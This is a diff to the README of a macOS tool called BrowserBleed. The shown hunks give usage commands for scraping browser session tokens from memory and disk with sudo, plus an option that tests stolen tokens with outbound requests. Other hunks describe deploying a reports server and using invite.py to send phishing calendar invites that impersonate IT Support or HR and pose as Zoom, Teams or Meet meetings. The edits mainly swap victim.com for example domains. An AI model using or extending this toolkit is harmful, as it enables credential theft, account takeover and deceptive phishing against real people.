@@ -285,7 +285,7 @@ sudo ./BrowserBleed_mac --browser chrome       # target one browser only
 sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
 sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
 sudo ./BrowserBleed_mac --verify               # verify tokens (outbound requests)
-sudo ./BrowserBleed_mac --max-hits 500         # lower memory hit cap (default: 1000)
+sudo ./BrowserBleed_mac --max-hits 500         # lower memory hit cap (default: 300)
 ```
 
 When running from source:
@@ -379,7 +379,7 @@ bash deploy/setup-server.sh
 bash deploy/deploy-binary.sh
 ```
 
-`setup-server.sh` writes four secrets to `/opt/bb-reports/.env` (mode 600) on the server:
+`setup-server.sh` creates `/opt/bb-reports/.env` (mode 600) on the server from the values in `deploy/config`:
 
 | Variable | Purpose |
 |----------|---------|
@@ -454,19 +454,19 @@ Deliver the smart link inside a convincing calendar invite. Two ways to generate
 ```bash
 python3 invite.py --preset chrome \
     --from-name "Sarah Johnson" --from-email sarah@company.com \
-    --to target@victim.com
+    --to target@target.example.com
 
 # Multiple recipients, Teams disguise:
 python3 invite.py --preset teams \
     --from-name "IT Support" --from-email it@company.com \
-    --to alice@victim.com --to bob@victim.com \
+    --to alice@target.example.com --to bob@target.example.com \
     --subject "Mandatory Security Training" --disguise teams \
     --date "2026-07-01 09:00"
 
 # Send directly via email (requires --send and SMTP/OAuth config):
 python3 invite.py --preset zoom --send \
     --from-name "HR" --from-email hr@company.com \
-    --to target@victim.com
+    --to target@target.example.com
 ```
 
 Available disguises: `zoom` (default for most presets), `teams`, `google-meet`, `generic`
